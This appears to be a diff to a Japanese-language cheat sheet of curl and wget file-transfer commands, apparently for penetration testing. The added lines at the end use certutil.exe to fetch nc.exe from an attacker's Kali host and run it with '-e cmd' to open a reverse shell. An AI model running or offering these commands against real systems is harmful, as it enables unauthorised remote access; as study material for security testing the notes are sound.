@@ -6,7 +6,6 @@ curl http://<IP>:<port>/<file name> -o <new file name>　#受信側のシェル�
 curl -I -Ss http://<IP>:<port> #-Iでヘッダ情報の表示　-Ssでエラー表示のみ表示
 curl -sS http://<IP>:<port> -I -u user:password # Basic認証
 
-
 //wget
 wget http://<IP>:<port>/<file name> #wgetバージョン
 wget --no-check-certificate http://<IP>:<port>/<file name> #wget httpsバージョン
@@ -102,3 +101,7 @@ wget --post-data="userid=XXXXXXX&password=YYYYYYY" --no-check-certificate "https
 --no-glob FTP ファイル名のグロブを無効にする
 --no-passive-ftp "passive" 転送モードを使わない
 --retr-symlinks 再帰取得中に、シンボリックリンクでリンクされた先のファイルを取得する
+
+//wgetやcurlが使えないwindowsのとき
+certutil.exe -urlcache -split -f http://<kali IP>:<port>/nc.exe C:\Windows\Temp\nc.exe　#コマンドでncを持ってくる
+cmd.exe /c C:\Windows\Temp\nc.exe <kali IP> <port> -e cmd #配送したncをcmdで実行してシェル
